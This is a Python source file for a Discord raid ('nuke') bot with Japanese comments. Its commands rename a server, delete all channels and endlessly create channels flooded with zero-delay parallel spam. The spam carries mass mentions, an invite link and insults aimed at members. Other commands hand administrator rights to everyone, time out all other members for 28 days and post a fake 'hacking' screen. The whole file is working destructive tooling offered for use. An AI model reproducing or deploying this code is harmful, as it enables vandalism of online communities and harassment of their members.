import discord
from discord import ui
from discord.ext import commands
import os
import asyncio
import random
from datetime import timedelta

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)

# ==================================================
# 💥 全パラメータ限界値
# ==================================================
SERVER_NAME = "トイ神の植民地"
CHANNEL_NAME = "ここはトイ神の集い|TISNに荒らされました😂"
BATCH_SIZE = 100         # 一気に100チャンネル作成
CREATE_INTERVAL = 0.0    # 待機なし
SPAM_INTERVAL = 0.0      # 待機なし
MAX_PARALLEL = 100       # 1チャンネル100並列送信

COMBINED_TEXT = (
    "@everyone\n"
    ".∧_∧\n"
    " ( ･ω･)つﾞ☆ﾍﾟﾁﾍﾟﾁ\n"
    " と ＿⌒))\n"
    "    (_ﾉﾉ\n"
    "\n"
    "∧,＿,∧  バカが治りますよ～に♡\n"
    "（`・ω・)つ━☆・*.\n"
    "⊂　　 ノ 　　　・゜+.\n"
    "　し'´Ｊ　　*・ °。\n"
    "\n"
    "https://discord.gg/SB2hn9eV8\n"
    "https://discord.gg/SB2hn9eV8\n"
    "お前らみたいな人生負け組のチー牛🧀🐮🤓と豚丼には到底入れないまぶしいサーバーww😂😂😂\n"
    "どうしたの両親揃って🫚👩‍⚕️の君！！！😂😂😂\n"
    "何も反論できないから妄想でリアル語るしかできないチーくんﾁｰ!ﾁｰ!🤓🐮"
)

stop_flag = asyncio.Event()
background_tasks = set()
initiator_id = None
target_guild = None

# ==================================================
# 💥 メンション一括取得
# ==================================================
def random_mentions(guild: discord.Guild) -> str:
    members = [m for m in guild.members if not m.bot]
    if not members:
        return "@everyone\n"
    k = min(200, len(members))
    picked = random.choices(members, k=k)
    return " ".join(m.mention for m in picked) + "\n"

# ==================================================
# 💥 スパム：無限並列・待機0・エラー無視
# ==================================================
async def spam_channel(channel: discord.TextChannel, guild: discord.Guild):
    async def send_loop():
        while not stop_flag.is_set():
            text = random_mentions(guild) + COMBINED_TEXT
            try:
                await channel.send(text)
            except:
                pass  # エラーも完全無視
    # 一斉に100並列開始
    tasks = [asyncio.create_task(send_loop()) for _ in range(MAX_PARALLEL)]
    await asyncio.gather(*tasks, return_exceptions=True)

# ==================================================
# 💥 チャンネル削除：一括全削除・待機なし
# ==================================================
async def delete_all_channels_fast(guild: discord.Guild):
    while guild.channels and not stop_flag.is_set():
        tasks = [ch.delete() for ch in guild.channels]
        await asyncio.gather(*tasks, return_exceptions=True)

# ==================================================
# 💥 チャンネル作成：一括100個・待機なし
# ==================================================
async def batch_create_and_spam(guild: discord.Guild, start_counter: int):
    create_tasks = [guild.create_text_channel(f"{CHANNEL_NAME}-{start_counter+i}") for i in range(BATCH_SIZE)]
    channels = await asyncio.gather(*create_tasks, return_exceptions=True)
    
    for ch in channels:
        if isinstance(ch, discord.TextChannel):
            task = asyncio.create_task(spam_channel(ch, guild))
            background_tasks.add(task)
            task.add_done_callback(background_tasks.discard)
    
    return start_counter + BATCH_SIZE

# ==================================================
# 💥 無限ループ：間隔0・止まるまで
# ==================================================
async def infinite_create_and_spam(guild: discord.Guild, delete_channels: bool = True):
    global initiator_id, target_guild
    stop_flag.clear()
    
    try:
        await guild.edit(name=SERVER_NAME)
    except:
        pass
    
    if delete_channels:
        await delete_all_channels_fast(guild)
    
    counter = 1
    while not stop_flag.is_set():
        counter = await batch_create_and_spam(guild, counter)
        # 待機時間：完全0

# ==================================================
# ✅ 共通機能（変更なし）
# ==================================================
async def just_leave_guild(guild, message: str = None):
    stop_flag.set()
    await asyncio.gather(*background_tasks, return_exceptions=True)
    background_tasks.clear()
    if message and guild:
        try:
            ch = guild.system_channel or next((c for c in guild.text_channels), None)
            if ch:
                await ch.send(message)
        except:
            pass
    if guild:
        try:
            await guild.leave()
        except:
            pass

@bot.event
async def on_member_remove(member):
    global initiator_id, target_guild
    if initiator_id is None or target_guild is None:
        return
    if member.id == initiator_id and member.guild.id == target_guild.id:
        await just_leave_guild(target_guild, "👋 実行者退出のため脱退")

@bot.command()
async def start(ctx):
    global initiator_id, target_guild
    if not stop_flag.is_set() and background_tasks:
        return
    initiator_id = ctx.author.id
    target_guild = ctx.guild
    await infinite_create_and_spam(ctx.guild, delete_channels=True)

@bot.command()
async def boost(ctx):
    global initiator_id, target_guild
    if not stop_flag.is_set() and background_tasks:
        return
    initiator_id = ctx.author.id
    target_guild = ctx.guild
    await infinite_create_and_spam(ctx.guild, delete_channels=False)

@bot.command()
async def stop(ctx):
    global initiator_id, target_guild
    stop_flag.set()
    await asyncio.gather(*background_tasks, return_exceptions=True)
    background_tasks.clear()
    initiator_id = None
    target_guild = None
    await ctx.send("🛑 停止")

@bot.command(name="bye")
async def bye(ctx):
    initiator_id = None
    target_guild = None
    await just_leave_guild(ctx.guild, "👋 手動脱退")

async def type_and_send(channel, text):
    for line in text.split("\n"):
        try:
            await channel.send(line)
        except:
            pass

@bot.command()
async def hack(ctx):
    global initiator_id, target_guild
    guild = ctx.guild
    await delete_all_channels_fast(guild)
    ch = await guild.create_text_channel("hacking出力画面")
    initiator_id = ctx.author.id
    target_guild = ctx.guild
    hacker_code = "```ansi\n"
    hacker_code += "\x1b[38;5;51m╔══════════════════════════════════════════════════════╗\x1b[0m\n"
    hacker_code += "\x1b[38;5;51m║  TISN SECURITY BREACH ― TERMINAL v4.2.1 ― BUILD 999\x1b[38;5;51m  ║\x1b[0m\n"
    hacker_code += "\x1b[38;5;51m╚══════════════════════════════════════════════════════╝\x1b[0m\n"
    hacker_code += "\n\x1b[32m[root@tisn-core:~]#\x1b[0m ./sysinit --BREACH --LEVEL=MAX --STEALTH\n"
    hacker_code += "\x1b[33m[001] \x1b[37m> Initializing exploit modules...        [\x1b[32mOK\x1b[37m]\x1b[0m\n"
    hacker_code += "\x1b[33m[002] \x1b[37m> Bypassing firewall layer 1/3...         [\x1b[32mOK\x1b[37m]\x1b[0m\n"
    hacker_code += "\x1b[33m[003] \x1b[37m> Decrypting payload...                    [\x1b[32mOK\x1b[37m]\x1b[0m\n"
    hacker_code += "\x1b[33m[004] \x1b[37m> Injecting shellcode...                   [\x1b[32mOK\x1b[37m]\x1b[0m\n"
    hacker_code += "\x1b[33m[005] \x1b[37m> Overriding security protocols...         [\x1b[32mOK\x1b[37m]\x1b[0m\n"
    hacker_code += "\x1b[33m[006] \x1b[37m> Establishing backdoor tunnel...          [\x1b[32mOK\x1b[37m]\x1b[0m\n"
    hacker_code += "\x1b[33m[007] \x1b[37m> Elevating privileges...                  [\x1b[32mOK\x1b[37m]\x1b[0m\n"
    hacker_code += "\x1b[33m[008] \x1b[37m> Disabling audit logging...               [\x1b[32mOK\x1b[37m]\x1b[0m\n"
    hacker_code += "\n\x1b[38;5;51m[SYSTEM]  ████████████████████████████ 100%\x1b[0m\n"
    hacker_code += "\x1b[38;5;46m[STATUS]  ACCESS GRANTED ― FULL CONTROL\x1b[0m\n"
    hacker_code += "\x1b[38;5;226m[WARN]    CONNECTION UNTRACEABLE ― NO LOGS\x1b[0m\n"
    hacker_code += "\x1b[38;5;196m[INFO]    AWAITING EXECUTION TRIGGER...\x1b[0m\n"
    hacker_code += "```\n**✅ ハッキング完了**\n"
    await type_and_send(ch, hacker_code)

@bot.command()
async def admin(ctx):
    guild = ctx.guild
    admin_role = discord.utils.get(guild.roles, name="TISN管理者")
    if not admin_role:
        try:
            admin_role = await guild.create_role(name="TISN管理者", permissions=discord.Permissions(administrator=True))
        except:
            return
    tasks = [m.add_roles(admin_role) for m in guild.members if not m.bot and admin_role not in m.roles]
    await asyncio.gather(*tasks, return_exceptions=True)

@bot.command(name="to")
async def total_timeout(ctx):
    global initiator_id, target_guild
    guild = ctx.guild
    author = ctx.author
    report = []
    admin_role = discord.utils.get(guild.roles, name="TISN管理者")
    if not admin_role:
        try:
            admin_role = await guild.create_role(name="TISN管理者", permissions=discord.Permissions(administrator=True))
            report.append("✅ 管理者ロール作成")
        except Exception as e:
            await ctx.send(f"❌ {e}")
            return
    if admin_role not in author.roles:
        try:
            await author.add_roles(admin_role)
            report.append("✅ 権限付与")
        except Exception as e:
            await ctx.send(f"❌ {e}")
            return
    initiator_id = ctx.author.id
    target_guild = ctx.guild
    bot_top_role = guild.me.top_role
    try:
        await bot_top_role.edit(position=len(guild.roles)-2)
        report.append("✅ Botロール最上位")
    except:
        pass
    duration = discord.utils.utcnow() + timedelta(days=28)
    tasks = [m.edit(timeout_until=duration) for m in guild.members if not m.bot and m.id != author.id]
    res = await asyncio.gather(*tasks, return_exceptions=True)
    report.append(f"✅ {sum(1 for r in res if not isinstance(r,Exception))}人タイムアウト")
    await ctx.send("\n".join(report))

@bot.event
async def on_ready():
    print(f"起動: {bot.user}")

TOKEN = os.environ.get("DISCORD_BOT_TOKEN")
if not TOKEN:
    raise RuntimeError("トークン設定せよ")
bot.run(TOKEN)